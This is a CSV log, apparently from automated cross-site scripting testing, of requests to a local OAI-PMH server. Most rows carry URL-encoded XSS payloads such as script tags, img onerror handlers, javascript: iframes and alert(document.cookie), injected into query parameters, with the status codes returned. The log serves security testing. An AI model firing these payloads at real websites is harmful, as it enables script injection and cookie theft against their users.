uuid,timestamp,http_status_code,request_url,response_time,http_version
20767a31-add4-4159-a21d-ac6d0e3e1eef,2024-12-31 05:32:29,403,http://localhost:8081/oai/request?verb=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,2048.95 ms,HTTP/1.1
7ec31048-fc65-4549-916b-5b5db112a7be,2024-12-31 05:32:31,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2034.70 ms,HTTP/1.1
2938ced3-c028-4657-b790-4f2a89b34ad8,2024-12-31 05:32:34,200,http://localhost:8081/oai/request?verb=ListSets,2051.01 ms,HTTP/1.1
dfec568c-e84e-468f-96a3-b8059bb9ddce,2024-12-31 05:32:36,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,2069.17 ms,HTTP/1.1
4274a454-3e70-4063-8d25-99f2f21800c1,2024-12-31 05:32:38,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&set=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,2059.50 ms,HTTP/1.1
b34a7cf5-df6b-4f58-acbc-8a9caeec6922,2024-12-31 05:32:40,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&metadataPrefix=marc,2077.64 ms,HTTP/1.1
479aa9c8-4657-4c11-baa8-c287549ef700,2024-12-31 05:32:43,403,http://localhost:8081/oai/request?verb=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF,2126.97 ms,HTTP/1.1
13db0ac4-616e-44c9-9388-86c19e8b60cf,2024-12-31 05:32:45,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF,2043.25 ms,HTTP/1.1
ca81c441-5119-43e4-933e-237450eaf4a1,2024-12-31 05:32:47,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF,2059.03 ms,HTTP/1.1
f5cb96a9-2fe8-4473-a661-47488ff80f7d,2024-12-31 05:32:50,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF&until=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF&set=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF,2062.23 ms,HTTP/1.1
867b31d9-00f2-4285-a642-07c00e2dac86,2024-12-31 05:32:52,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF,2084.34 ms,HTTP/1.1
94c32383-b2c4-42a5-97b4-a62a96d094ab,2024-12-31 05:32:54,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3C%2Fiframe%3E%3Cscript%3Ealert%28%60TEXT+YOU+WANT+TO+BE+DISPLAYED%60%29%3B%3C%2Fscript%3E%3Ciframe+frameborder%3D%220%25EF%25BB%25BF&metadataPrefix=oai_dc,2110.66 ms,HTTP/1.1
2f2348fb-d2d1-43f6-86a6-1e4fecf85878,2024-12-31 05:32:56,403,http://localhost:8081/oai/request?verb=%22%3E%3CBODY+onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,2051.76 ms,HTTP/1.1
c0973bd8-2252-4414-bbfb-13f95bcdd5a8,2024-12-31 05:32:59,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3CBODY+onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,2060.58 ms,HTTP/1.1
fb184b6b-e2b7-4801-883c-e6f495e5c716,2024-12-31 05:33:01,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3CBODY+onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,2069.66 ms,HTTP/1.1
309e9215-cfd4-4002-bf74-c9f01d1c0319,2024-12-31 05:33:03,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%22%3E%3CBODY+onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,2044.81 ms,HTTP/1.1
866a4fb3-37da-4b21-9f05-aed020255548,2024-12-31 05:33:06,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%22%3E%3CBODY+onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,2093.68 ms,HTTP/1.1
178f5e6a-5085-4aa6-9586-1c95b877db68,2024-12-31 05:33:10,403,http://localhost:8081/oai/request?verb=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22,2021.98 ms,HTTP/1.1
d2f9931f-6620-47b7-82a8-f340000a711e,2024-12-31 05:33:12,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2073.66 ms,HTTP/1.1
6212c99c-e64e-4327-acbd-18d545f3eebf,2024-12-31 05:33:15,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22,2042.05 ms,HTTP/1.1
3a43831e-4f5f-4e62-aab5-26fabfc3b312,2024-12-31 05:33:17,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22&until=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22&set=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22,2042.07 ms,HTTP/1.1
055130a1-ff32-4b04-968b-f49d7efda2ff,2024-12-31 05:33:19,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22,2044.47 ms,HTTP/1.1
f42229e7-5820-4772-9cc7-bec4fd9beb86,2024-12-31 05:33:21,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3Cimg+src%3D%22%22+alt%3D%22&metadataPrefix=marc,2074.21 ms,HTTP/1.1
533def28-8ca7-4d12-a511-b1bdafed8d83,2024-12-31 05:33:24,403,http://localhost:8081/oai/request?verb=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E,2040.37 ms,HTTP/1.1
02a523bd-9efc-46c7-a636-ae781fb3eecc,2024-12-31 05:33:26,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2030.13 ms,HTTP/1.1
c750e32f-6936-4250-a040-6161eb100172,2024-12-31 05:33:28,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E,2076.52 ms,HTTP/1.1
7f32d319-14d3-4acf-a15c-cdd17a735a9d,2024-12-31 05:33:31,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E,2048.12 ms,HTTP/1.1
3b19e0d3-2d06-4782-a5d3-9fd4e68ee10b,2024-12-31 05:33:33,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E&until=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E&set=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E,2051.28 ms,HTTP/1.1
ff71c80e-4159-45e3-b737-ac4c64a8f4f9,2024-12-31 05:33:35,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3CSTYLE%3E%40import%22javascript%3Aalert%28%27XSS%27%29%22%3B%3C%2FSTYLE%3E&metadataPrefix=marc,2068.27 ms,HTTP/1.1
e77ece0b-f923-4198-ae77-2f868278df1a,2024-12-31 05:33:37,403,http://localhost:8081/oai/request?verb=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E%22%3E123%3C%2Fh1%3E,2036.61 ms,HTTP/1.1
39794e44-d7cc-44ba-a4df-1ace12f04883,2024-12-31 05:33:40,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E%22%3E123%3C%2Fh1%3E,2086.58 ms,HTTP/1.1
5e0cc978-33e4-498a-a379-442f6f12c9d9,2024-12-31 05:33:42,200,http://localhost:8081/oai/request?verb=ListSets,2073.06 ms,HTTP/1.1
0f3b2741-ef7d-43ed-9844-77040c2d39ff,2024-12-31 05:33:44,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E%22%3E123%3C%2Fh1%3E,2082.56 ms,HTTP/1.1
2f9fdba0-ca27-4ec7-9d51-78ae12c680d7,2024-12-31 05:33:46,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E%22%3E123%3C%2Fh1%3E,2065.91 ms,HTTP/1.1
6f79f36e-21df-4e14-b78d-5b81e6ad0cfd,2024-12-31 05:33:49,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E%22%3E123%3C%2Fh1%3E&metadataPrefix=marc,2053.15 ms,HTTP/1.1
cd71ffdc-5472-4d3d-9203-f580c9310247,2024-12-31 05:33:51,403,http://localhost:8081/oai/request?verb=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2056.14 ms,HTTP/1.1
dc267f2b-2cc6-4654-9adc-59623119d41c,2024-12-31 05:33:53,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2079.55 ms,HTTP/1.1
fca4f96d-2102-4a75-b9ff-998338ea1a77,2024-12-31 05:33:56,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2056.65 ms,HTTP/1.1
4866eb2a-9b91-4d39-a64b-016c704dd6bd,2024-12-31 05:33:58,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E&until=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E&set=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2061.72 ms,HTTP/1.1
1ee0b895-b11f-4caf-ad95-01a4b4cd6f9a,2024-12-31 05:34:00,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2053.41 ms,HTTP/1.1
96e8bba7-213c-478c-b80a-e967ff660bcb,2024-12-31 05:34:02,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3Ch1%3E%3CIFRAME+SRC%3D%23+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E&metadataPrefix=marc,2046.13 ms,HTTP/1.1
7e5377fd-1e03-46bf-80f3-45c3f7c53a43,2024-12-31 05:34:05,403,http://localhost:8081/oai/request?verb=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2067.84 ms,HTTP/1.1
5e5905fd-3e77-488d-ba06-8de5ddcf6d6c,2024-12-31 05:34:07,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2037.61 ms,HTTP/1.1
cfc488b9-6905-487d-86df-8e86e332abea,2024-12-31 05:34:09,200,http://localhost:8081/oai/request?verb=ListSets,2097.66 ms,HTTP/1.1
98420409-28cf-4b25-85da-a8139fab5321,2024-12-31 05:34:11,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E&set=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2059.08 ms,HTTP/1.1
c79a1abb-5952-4be3-94f7-fc6bbd099a0f,2024-12-31 05:34:14,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E&set=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E,2069.01 ms,HTTP/1.1
612fe945-56a0-43cf-971a-58e1317278ca,2024-12-31 05:34:16,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3Ch1%3E%3CIFRAME+width%3D%22420%22+height%3D%22315%22+SRC%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+onmouseover%3D%22alert%28document.cookie%29%22%3E%3C%2FIFRAME%3E123%3C%2Fh1%3E&metadataPrefix=oai_dc,2086.58 ms,HTTP/1.1
6276d727-2d7f-4b17-a923-60c42b8bd508,2024-12-31 05:34:18,403,http://localhost:8081/oai/request?verb=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E,2021.98 ms,HTTP/1.1
d0d7c088-8e36-4c99-87e4-5b7f087c664e,2024-12-31 05:34:21,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E,2076.21 ms,HTTP/1.1
988ab7d5-dfa0-4109-91d6-a389214a5d9f,2024-12-31 05:34:23,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E,2053.35 ms,HTTP/1.1
a875ae3c-97f0-454e-a246-36e02fc6a9a6,2024-12-31 05:34:25,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E&set=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E,2047.24 ms,HTTP/1.1
1a2944cc-ebce-4215-af32-a8827de7c0f1,2024-12-31 05:34:27,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E&set=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E,2071.59 ms,HTTP/1.1
4c3efd8f-346d-4b7b-8c7b-c1c453bab4fa,2024-12-31 05:34:30,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3Ch1%3E%3Ciframe+width%3D%22420%22+height%3D%22315%22+src%3D%22http%3A%2F%2Fwww.youtube.com%2Fembed%2FsxvccpasgTE%22+frameborder%3D%220%22+allowfullscreen%3E%3C%2Fiframe%3E123%3C%2Fh1%3E&metadataPrefix=marc,2061.22 ms,HTTP/1.1
2bac91bf-6880-48dd-bad6-8fb8bd657c94,2024-12-31 05:34:32,403,http://localhost:8081/oai/request?verb=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E,2051.72 ms,HTTP/1.1
60127525-4a81-4d27-bcef-2d3b4546b00a,2024-12-31 05:34:34,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E,2080.82 ms,HTTP/1.1
33f88f00-941d-4539-9727-f7997bbebf33,2024-12-31 05:34:37,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E,2044.30 ms,HTTP/1.1
c7f3ce2d-c546-4d7b-a76d-1b84a6d23104,2024-12-31 05:34:39,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E&set=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E,2042.47 ms,HTTP/1.1
5f60d028-e9e5-46bf-97e6-1f4fc4e0a664,2024-12-31 05:34:41,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E&until=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E,2054.93 ms,HTTP/1.1
6a589df4-0e2a-4799-bd48-9c5ca6f33331,2024-12-31 05:34:43,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%221%22%29%3E&metadataPrefix=oai_dc,2185.45 ms,HTTP/1.1
90f762de-9431-4177-adbc-3da5fbf168c2,2024-12-31 05:34:46,403,http://localhost:8081/oai/request?verb=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E,2048.81 ms,HTTP/1.1
c00f171b-5790-4156-b703-efcde9829809,2024-12-31 05:34:48,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E,2051.36 ms,HTTP/1.1
c4d0b3a8-0d5b-4c72-a192-5a945ed52367,2024-12-31 05:34:50,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E,2055.78 ms,HTTP/1.1
1f3a7f7f-6691-4f12-a204-e1c9bdc64b51,2024-12-31 05:34:53,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E&set=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E,2090.63 ms,HTTP/1.1
3a33c02d-5b76-4bfc-b45a-834cd5d6dcbf,2024-12-31 05:34:55,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E&until=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E&set=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%22A%22%29%3E,2026.19 ms,HTTP/1.1
c0addab1-bda3-4f44-be42-4506447d131d,2024-12-31 05:34:59,403,http://localhost:8081/oai/request?verb=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%271%27%29%3E,2036.61 ms,HTTP/1.1
9f396f06-3d7b-4eeb-9033-0f5618c88b07,2024-12-31 05:35:02,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2056.16 ms,HTTP/1.1
c9a32cf1-ec87-4f08-9851-c47bc3c76b6b,2024-12-31 05:35:04,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%271%27%29%3E,2055.68 ms,HTTP/1.1
4e4cfee5-b504-413e-a344-9988dccb09ba,2024-12-31 05:35:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%271%27%29%3E&until=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%271%27%29%3E&set=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%271%27%29%3E,2070.17 ms,HTTP/1.1
09f5ce8b-ffc9-4a38-8471-e9338b3e9ff8,2024-12-31 05:35:09,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2062.78 ms,HTTP/1.1
5ba0f205-5c35-4508-850e-dd83fa41977b,2024-12-31 05:35:11,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%271%27%29%3E&metadataPrefix=marc,2056.56 ms,HTTP/1.1
d8351b1b-6ccd-4391-90ae-ba7afbbe7f80,2024-12-31 05:35:13,403,http://localhost:8081/oai/request?verb=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%27A%27%29%3E,2055.85 ms,HTTP/1.1
2b5e9982-369b-48fc-a586-9f0ddd73b1bb,2024-12-31 05:35:15,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%27A%27%29%3E,2098.78 ms,HTTP/1.1
d3074e1e-a21b-4535-a628-8b83bfe1e59c,2024-12-31 05:35:18,200,http://localhost:8081/oai/request?verb=ListSets,2046.63 ms,HTTP/1.1
202e01f7-9069-4cd5-91fb-bdcb999baada,2024-12-31 05:35:20,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%27A%27%29%3E,2070.26 ms,HTTP/1.1
27dce047-be41-44ac-a1c3-065a1d261f81,2024-12-31 05:35:22,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28%27A%27%29%3E,2057.10 ms,HTTP/1.1
